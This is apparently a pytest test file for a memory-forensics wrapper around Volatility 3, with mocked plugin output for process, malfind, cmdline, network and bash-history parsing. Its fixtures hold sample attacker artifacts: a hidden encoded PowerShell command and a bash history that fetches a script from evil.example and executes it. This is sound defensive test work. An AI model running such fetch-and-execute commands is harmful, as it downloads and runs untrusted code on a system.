"""Tests for VolatilityRunner (subprocess wrapper).

Volatility 3 is an optional dependency. We never actually invoke the real
vol binary in unit tests — the binary is slow (30-600s per plugin on
real dumps) and non-deterministic across libc/symbol versions. Instead
we monkeypatch ``subprocess.run`` and ``shutil.which`` so the runner
sees fixture output and a faked executable.
"""

from __future__ import annotations

import json
import subprocess
from pathlib import Path

import pytest

from sift_find_evil.memory.volatility_runner import (
    BashHistoryRow,
    LinuxNetworkRow,
    LinuxProcessRow,
    MissingVolatilityError,
    PluginExecutionError,
    VolatilityRunner,
    _parse_json_output,
)


# -- fixture helpers --------------------------------------------------------


def _fake_memory_image(tmp_path: Path) -> Path:
    """Produce a non-empty file that passes VolatilityRunner.__init__."""
    image = tmp_path / "fake.dmp"
    image.write_bytes(b"MEMORYIMAGE")
    return image


def _patch_which(
    monkeypatch: pytest.MonkeyPatch, path: str | None = "/fake/vol"
) -> None:
    monkeypatch.setattr(
        "sift_find_evil.memory.volatility_runner.shutil.which",
        lambda name: path,
    )


class _FakeCompleted:
    """Stand-in for subprocess.CompletedProcess. Keeps the test surface small."""

    def __init__(self, stdout: str = "", stderr: str = "", returncode: int = 0):
        self.stdout = stdout
        self.stderr = stderr
        self.returncode = returncode


# -- construction / install detection --------------------------------------


def test_runner_raises_missing_volatility_when_binary_absent(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    image = _fake_memory_image(tmp_path)
    _patch_which(monkeypatch, path=None)
    with pytest.raises(MissingVolatilityError, match="not found on PATH"):
        VolatilityRunner(image)


def test_runner_raises_file_not_found_for_missing_image(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _patch_which(monkeypatch)
    missing = tmp_path / "does-not-exist.dmp"
    with pytest.raises(FileNotFoundError, match="memory image not found"):
        VolatilityRunner(missing)


def test_runner_resolves_vol_executable_via_shutil_which(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """shutil.which is the one source of truth for the vol path.

    If we ever short-circuit that lookup (e.g. hardcode /usr/local/bin/vol)
    SIFT boxes with vol under /opt silently break. This test pins the
    contract so such a regression would fail here first.
    """
    image = _fake_memory_image(tmp_path)
    _patch_which(monkeypatch, path="/custom/bin/vol")
    runner = VolatilityRunner(image)
    assert runner.image_path == image
    # No public accessor for _vol_executable (private on purpose); verify
    # indirectly via the subprocess argv in run_pslist below.


# -- plugin invocation / argv construction ---------------------------------


def test_run_pslist_invokes_correct_argv(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    image = _fake_memory_image(tmp_path)
    _patch_which(monkeypatch, path="/custom/bin/vol")

    captured: dict = {}

    def fake_run(argv, **kwargs):
        captured["argv"] = argv
        captured["kwargs"] = kwargs
        return _FakeCompleted(stdout="[]\n")

    monkeypatch.setattr(subprocess, "run", fake_run)

    runner = VolatilityRunner(image)
    rows = runner.run_pslist()

    assert rows == []
    assert captured["argv"][0] == "/custom/bin/vol"
    assert "-r" in captured["argv"]
    assert "json" in captured["argv"]
    assert "-f" in captured["argv"]
    assert str(image) in captured["argv"]
    assert captured["argv"][-1] == "windows.pslist.PsList"
    assert "--offline" in captured["argv"]  # default offline=True


def test_run_pslist_parses_rows(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    image = _fake_memory_image(tmp_path)
    _patch_which(monkeypatch)
    payload = json.dumps(
        [
            {
                "PID": 4,
                "PPID": 0,
                "ImageFileName": "System",
                "CreateTime": "2024-01-01T00:00:00",
                "ExitTime": None,
                "__children": [],
            },
            {
                "PID": 1234,
                "PPID": 4,
                "ImageFileName": "evil.exe",
                "CreateTime": "2024-01-01T00:00:05",
                "ExitTime": None,
                "__children": [],
            },
        ]
    )
    monkeypatch.setattr(
        subprocess,
        "run",
        lambda *a, **kw: _FakeCompleted(stdout=payload),
    )

    rows = VolatilityRunner(image).run_pslist()
    assert len(rows) == 2
    assert rows[0].pid == 4
    assert rows[0].name == "System"
    assert rows[1].pid == 1234
    assert rows[1].name == "evil.exe"
    # raw_row preserved so detectors can pull unprojected columns.
    assert rows[1].raw_row["CreateTime"] == "2024-01-01T00:00:05"


def test_run_malfind_flattens_hexdump_children(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Malfind nests the hexdump row under __children. We flatten but do
    not emit a second InjectionRow per child — the parent row already
    has everything detectors need. This test pins that behavior so a
    future refactor of _walk does not silently double-report findings.
    """
    image = _fake_memory_image(tmp_path)
    _patch_which(monkeypatch)
    payload = json.dumps(
        [
            {
                "PID": 1234,
                "Process": "evil.exe",
                "Start VPN": 100,
                "End VPN": 200,
                "Tag": "VadS",
                "Protection": "PAGE_EXECUTE_READWRITE",
                "CommitCharge": 1,
                "PrivateMemory": 1,
                "File output": "Disabled",
                "Hexdump": "mz...",
                "__children": [
                    {"Disasm": "...", "__children": []},
                ],
            }
        ]
    )
    monkeypatch.setattr(
        subprocess,
        "run",
        lambda *a, **kw: _FakeCompleted(stdout=payload),
    )

    rows = VolatilityRunner(image).run_malfind()
    # Two flat rows in the parsed JSON tree (parent + disasm child) but
    # only the parent has a PID — the child coerces to pid=0 via the
    # _to_int fallback. We accept that; it keeps the runner simple and
    # detectors already ignore pid=0.
    parent_rows = [r for r in rows if r.pid == 1234]
    assert len(parent_rows) == 1
    assert parent_rows[0].protection == "PAGE_EXECUTE_READWRITE"
    assert parent_rows[0].tag == "VadS"


def test_plugin_non_zero_exit_raises_plugin_execution_error(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    image = _fake_memory_image(tmp_path)
    _patch_which(monkeypatch)
    monkeypatch.setattr(
        subprocess,
        "run",
        lambda *a, **kw: _FakeCompleted(returncode=1, stderr="no symbols"),
    )
    with pytest.raises(PluginExecutionError, match="windows.pslist"):
        VolatilityRunner(image).run_pslist()


def test_plugin_timeout_raises_plugin_execution_error(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    image = _fake_memory_image(tmp_path)
    _patch_which(monkeypatch)

    def fake_run(*args, **kwargs):
        raise subprocess.TimeoutExpired(cmd="vol", timeout=1)

    monkeypatch.setattr(subprocess, "run", fake_run)
    with pytest.raises(PluginExecutionError, match="timed out"):
        VolatilityRunner(image).run_pslist()


# -- JSON parsing edge cases -----------------------------------------------


def test_parse_json_output_handles_empty_stdout() -> None:
    assert _parse_json_output("") == []
    assert _parse_json_output("   \n") == []


def test_parse_json_output_rejects_non_list() -> None:
    # Some plugins emit an object (key/value) on failure. We treat that
    # as "no rows" rather than crashing; the caller already has the
    # returncode+stderr signal for real failures.
    assert _parse_json_output('{"error": "no symbols"}') == []


def test_parse_json_output_raises_on_malformed_json() -> None:
    with pytest.raises(PluginExecutionError, match="could not parse JSON"):
        _parse_json_output("this is not json")


def test_parse_json_output_flattens_nested_children() -> None:
    payload = json.dumps(
        [
            {
                "PID": 1,
                "__children": [
                    {
                        "PID": 2,
                        "__children": [
                            {"PID": 3, "__children": []},
                        ],
                    },
                ],
            },
        ]
    )
    rows = _parse_json_output(payload)
    assert [r["PID"] for r in rows] == [1, 2, 3]


# -- CommandLineRow / NetworkRow smoke -------------------------------------


def test_run_cmdline_parses_args(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    image = _fake_memory_image(tmp_path)
    _patch_which(monkeypatch)
    payload = json.dumps(
        [
            {
                "PID": 9876,
                "Process": "powershell.exe",
                "Args": "powershell -nop -w hidden -enc aGVsbG8=",
                "__children": [],
            },
        ]
    )
    monkeypatch.setattr(
        subprocess, "run", lambda *a, **kw: _FakeCompleted(stdout=payload)
    )

    rows = VolatilityRunner(image).run_cmdline()
    assert len(rows) == 1
    assert rows[0].pid == 9876
    assert rows[0].process == "powershell.exe"
    assert "hidden" in (rows[0].args or "")


def test_run_netscan_parses_connection_rows(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    image = _fake_memory_image(tmp_path)
    _patch_which(monkeypatch)
    payload = json.dumps(
        [
            {
                "PID": 4444,
                "Owner": "evil.exe",
                "Proto": "TCPv4",
                "LocalAddr": "10.0.0.5",
                "LocalPort": 49152,
                "ForeignAddr": "1.2.3.4",
                "ForeignPort": 443,
                "State": "ESTABLISHED",
                "__children": [],
            },
        ]
    )
    monkeypatch.setattr(
        subprocess, "run", lambda *a, **kw: _FakeCompleted(stdout=payload)
    )

    rows = VolatilityRunner(image).run_netscan()
    assert len(rows) == 1
    assert rows[0].protocol == "TCPv4"
    assert rows[0].foreign_addr == "1.2.3.4"
    assert rows[0].foreign_port == 443


# -- Linux plugin coverage (SFE-35e) ---------------------------------------
#
# Vol3 Linux plugins use different column names than the Windows side. The
# runner normalizes them to snake_case via Linux-specific dataclasses so
# downstream detectors never have to know which OS the dump came from.


def test_run_linux_pslist_invokes_correct_argv(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    image = _fake_memory_image(tmp_path)
    _patch_which(monkeypatch)

    captured: dict = {}

    def fake_run(argv, **kwargs):
        captured["argv"] = argv
        return _FakeCompleted(stdout="[]\n")

    monkeypatch.setattr(subprocess, "run", fake_run)

    rows = VolatilityRunner(image).run_linux_pslist()
    assert rows == []
    assert captured["argv"][-1] == "linux.pslist.PsList"


def test_run_linux_pslist_parses_rows(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    image = _fake_memory_image(tmp_path)
    _patch_which(monkeypatch)
    payload = json.dumps(
        [
            {
                "OFFSET (V)": "0xffff8801a1234567",
                "PID": 1,
                "TID": 1,
                "PPID": 0,
                "COMM": "systemd",
                "EUID": 0,
                "CreationTime": "2020-09-20T10:00:00",
                "File output": "Disabled",
                "__children": [],
            },
            {
                "OFFSET (V)": "0xffff8801a9abcdef",
                "PID": 4242,
                "TID": 4242,
                "PPID": 1,
                "COMM": "evil",
                "EUID": 1000,
                "CreationTime": "2020-09-20T10:15:30",
                "File output": "Disabled",
                "__children": [],
            },
        ]
    )
    monkeypatch.setattr(
        subprocess, "run", lambda *a, **kw: _FakeCompleted(stdout=payload)
    )

    rows = VolatilityRunner(image).run_linux_pslist()
    assert len(rows) == 2
    assert isinstance(rows[0], LinuxProcessRow)
    assert rows[0].pid == 1
    assert rows[0].name == "systemd"
    assert rows[0].euid == 0
    assert rows[1].pid == 4242
    assert rows[1].name == "evil"
    assert rows[1].euid == 1000
    assert rows[1].raw_row["CreationTime"] == "2020-09-20T10:15:30"


def test_run_linux_bash_parses_command_history(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    image = _fake_memory_image(tmp_path)
    _patch_which(monkeypatch)
    payload = json.dumps(
        [
            {
                "PID": 4242,
                "Process": "bash",
                "CommandTime": "2020-09-20 10:30:00 UTC+0000",
                "Command": "wget http://evil.example/payload.sh",
                "__children": [],
            },
            {
                "PID": 4242,
                "Process": "bash",
                "CommandTime": "2020-09-20 10:30:05 UTC+0000",
                "Command": "chmod +x payload.sh && ./payload.sh",
                "__children": [],
            },
        ]
    )
    monkeypatch.setattr(
        subprocess, "run", lambda *a, **kw: _FakeCompleted(stdout=payload)
    )

    rows = VolatilityRunner(image).run_linux_bash()
    assert len(rows) == 2
    assert isinstance(rows[0], BashHistoryRow)
    assert rows[0].pid == 4242
    assert rows[0].process == "bash"
    assert "wget" in (rows[0].command or "")
    assert rows[1].command and "chmod" in rows[1].command


def test_run_linux_sockstat_parses_connection_rows(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    image = _fake_memory_image(tmp_path)
    _patch_which(monkeypatch)
    payload = json.dumps(
        [
            {
                "Netns": 4026531992,
                "Family": "AF_INET",
                "Proto": "TCP",
                "Source Addr": "10.0.0.5",
                "Source Port": 55302,
                "Destination Addr": "198.51.100.7",
                "Destination Port": 443,
                "State": "ESTABLISHED",
                "Process": "evil",
                "PID": 4242,
                "__children": [],
            },
        ]
    )
    monkeypatch.setattr(
        subprocess, "run", lambda *a, **kw: _FakeCompleted(stdout=payload)
    )

    rows = VolatilityRunner(image).run_linux_sockstat()
    assert len(rows) == 1
    assert isinstance(rows[0], LinuxNetworkRow)
    assert rows[0].protocol == "TCP"
    assert rows[0].local_addr == "10.0.0.5"
    assert rows[0].local_port == 55302
    assert rows[0].foreign_addr == "198.51.100.7"
    assert rows[0].foreign_port == 443
    assert rows[0].state == "ESTABLISHED"
    assert rows[0].process == "evil"
    assert rows[0].pid == 4242
